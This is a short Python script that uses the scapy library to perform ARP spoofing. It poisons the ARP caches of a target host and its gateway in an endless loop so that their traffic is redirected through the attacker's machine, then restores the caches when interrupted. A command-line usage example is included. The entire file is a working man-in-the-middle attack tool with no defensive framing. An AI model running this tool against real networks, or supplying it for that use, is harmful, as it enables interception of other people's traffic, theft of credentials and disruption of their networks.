import scapy.all as scapy
import time
from getopt import getopt
import sys

def get_mac(ip):
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast / arp_request
	answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
	return answered_list[0][1].hwsrc

def spoof(target_ip, gateway_ip):
	target_mac = get_mac(target_ip)
	arp_response = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip)
	scapy.send(arp_response, verbose = False)

def restore(target_ip, gateway_ip):
	target_mac = get_mac(target_ip)
	gateway_mac = get_mac(gateway_ip)
	arp_response = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = gateway_ip, hwsrc = gateway_mac)
	scapy.send(arp_response, verbose = False, count = 7)

if __name__ == "__main__":
	args, _ = getopt(sys.argv[1:], "t:g:", ["target", "gateway"])

	if len(sys.argv) < 2:
		print("[!] Arguments insuficient")
		print("Usage: ")
		print("-t --target			- set the target IP Address")
		print("-g --gateway			- set the gateway IP Address")
		print("")
		print("Example:")
		print("python3 arp.py -t 192.168.229.128 -g 192.168.229.2")
		exit()
		
	for key, value in args:
		if key in ["-t", "--target"]:
			target_ip = value
		elif key in ["-g", "--gateway"]:
			gateway_ip = value

	try:
		print("[!] ARP Spoofing starting...")
		while True:
			spoof(target_ip, gateway_ip)
			spoof(gateway_ip, target_ip)
			time.sleep(2) # Waits for two seconds
	except KeyboardInterrupt:
		print("[!] Ctrl + C Detected! Restoring network...")
		restore(gateway_ip, target_ip)
		restore(target_ip, gateway_ip)
		print("[!] Network restored")
		print("[!] ARP Spoofing exited")
